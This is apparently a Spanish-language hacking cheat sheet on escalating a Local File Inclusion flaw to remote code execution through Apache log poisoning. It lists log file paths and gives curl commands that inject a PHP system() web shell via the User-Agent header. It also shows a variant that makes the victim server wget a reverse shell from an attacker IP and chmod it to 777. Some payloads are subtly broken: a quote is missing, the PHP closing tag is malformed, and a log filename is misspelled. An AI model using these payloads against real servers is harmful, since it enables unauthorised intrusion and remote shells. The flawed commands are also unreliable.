___Como requisito necesitamos poder explotar un LFI y que el servidor web interprete PHP___

Podemos realizar un envenenamiento de los logs del servidor web, de manera que nos interprete el código php contenido en el **user-agent** que vamos a enviar intencionadamente sustituyendolo por el original, llegando a ejecución remota de comandos.


### Rutas de logs
+ /var/log/apache2/acces.log
+ /var/log/apache/acces.log
+ /var/log/httpd/acces.log
+ /var/log/httpd-acces.log

### Envenenamiento del log
Lo ideal es tratar de meter una reverse shell.
#### Opcion 1
```bash
curl -s -X GET 'http://ip_victima' -H "User-Agent: <?php system($_GET['cmd]); ?"

y luego en la URL con un:
http://ip/ruta_al_log&cmd="comando que se quiera inyectar"
```

#### Opcion 2
Con el concepto de la primera opción, crear una php reverse shell (descargar de github), montar un servidor web en pythton, e inyectar lo siguiente:

```bash
curl -s -X GET 'http://ip_victima' -H "User-Agent: <?php system('wget http://ip_atacante/php-reverse-shell.php'); ?"

y luego le damos permisos a esa reverse shell
curl -s -X GET 'http://ip_victima' -H "User-Agent: <?php system('chmod 777 php-reverse-shell.php'); ?"

ya solo falta ponernos a la escucha y recargar el log
```
### Extra
En ocasiones, dependiendo de las peticiones extrañas que se le puedan hacer, o si se trata de máquinas virtuales, se puede llegar a corromper el fichero, basta con reiniciar la máquina.
